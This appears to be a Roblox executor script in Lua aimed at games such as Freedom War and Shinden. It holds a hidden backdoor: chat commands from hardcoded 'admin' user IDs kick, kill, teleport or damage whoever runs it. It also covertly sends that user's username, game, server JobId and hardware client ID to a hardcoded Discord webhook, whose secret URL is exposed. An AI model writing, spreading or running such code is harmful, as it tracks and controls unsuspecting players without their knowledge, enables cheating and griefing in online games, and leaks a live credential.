local Games = {
	FreedomWar = {
		Lobby = 11534222714,
		Campaign = 11564374799,
		Practice = 11567929685,
	},
	Shinden = {
		Lobby = 6808589067,
		Main = 10369535604,
	},
}

local admins = {
	[248924950] = true,
	[2361327414] = true,
	[4019040138] = true,
	[2524525918] = true,
	[4296548955] = true,
	[2049673243] = true,
	[5706425897] = true,
	[12403712] = true,
}

local webhookURL = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2"

function FindUser(Partial)
	for _, player in pairs(game:GetService("Players"):GetPlayers()) do
		if player.Name:lower():match(Partial:lower()) then
			return player
		end
	end
	return nil
end

local commands = {
	kick = function(targetPlayer)
		targetPlayer:Kick("vvhub3301n1n")
	end,
	teleport = function(targetPlayer, adminPlayer)
		if game.PlaceId == Games.FreedomWar.Campaign then
			local args = {
				[1] = adminPlayer.Character.HumanoidRootPart.CFrame
			}

			game:GetService("ReplicatedStorage"):WaitForChild("ServerTeleportFunction"):InvokeServer(unpack(args))
		end

		if game.PlaceId == Games.FreedomWar.Practice then
			local args = {
				[1] = adminPlayer.Character.HumanoidRootPart.CFrame
			}

			game:GetService("ReplicatedStorage"):WaitForChild("ServerTeleportFunction"):InvokeServer(unpack(args))
		end

		if game.PlaceId == Games.Shinden.Main then
			local HRP = targetPlayer.Character.HumanoidRootPart

			local targetCFrame = adminPlayer.Character.HumanoidRootPart.CFrame
			local tweenInfo = TweenInfo.new(23)

			local tween = game:GetService("TweenService"):Create(HRP, tweenInfo, {CFrame = targetCFrame})
			targetPlayer.Character:WaitForChild("Head").CanCollide = false
			targetPlayer.Character:WaitForChild("Torso").CanCollide = false
			tween:Play()

			tween.Completed:Connect(function()
				targetPlayer.Character:WaitForChild("Head").CanCollide = false
				targetPlayer.Character:WaitForChild("Torso").CanCollide = false
			end)
		end

		if game.PlaceId ~= Games.Shinden.Main and game.PlaceId ~= Games.FreedomWar.Campaign and game.PlaceId ~= Games.FreedomWar.Practice then
			if adminPlayer.Character and targetPlayer.Character then
				targetPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame
			end
		end
	end,
	kill = function(targetPlayer)
		targetPlayer.Character.Humanoid.Health = 0
	end,
	down = function(targetPlayer)
		local args = {
			[1] = 10000
		}

		if game.PlaceId == Games.Shinden.Main then
			game:GetService("ReplicatedStorage"):WaitForChild("GameRemotes"):WaitForChild("Other"):WaitForChild("SelfHarm"):FireServer(unpack(args))
		end
	end,
	message = function(targetPlayer, msg)
		getgenv().message(msg)
	end,
}

local function HandlePlayerChat(Msg, player)
	local command, target = Msg:lower():match("^/?e%s+([^%s]+)%s+(.*)$")
	if not command then
		command, target = Msg:lower():match("^/?([^%s]+)%s+(.*)$")
	end
	if command and commands[command] then
		local targetPlayer = FindUser(target)
		if targetPlayer then
			commands[command](targetPlayer, player)
		else
			return
		end
	elseif not commands[command] then
		return
	end
end

local function ConnectPlayer(player)
	if admins[player.UserId] then
		player.Chatted:Connect(function(Msg)
			HandlePlayerChat(Msg, player)
		end)
	end
end

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
	ConnectPlayer(player)
end

game:GetService("Players").PlayerAdded:Connect(ConnectPlayer)

local player = game.Players.LocalPlayer
local username = player.Name
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local executorName = identifyexecutor()
local executorText = ""

if executorName == "Wave" then
	executorText = "Wave"
elseif executorName == "Solara" then
	executorText = "Solara"
else
	executorText = "Unknown"
end

local embed = {
	["title"] = username,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = executorText,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = gameName,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local httpRequest = {
	Url = webhookURL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

if executorName == "Wave" then
	request(httpRequest)
end
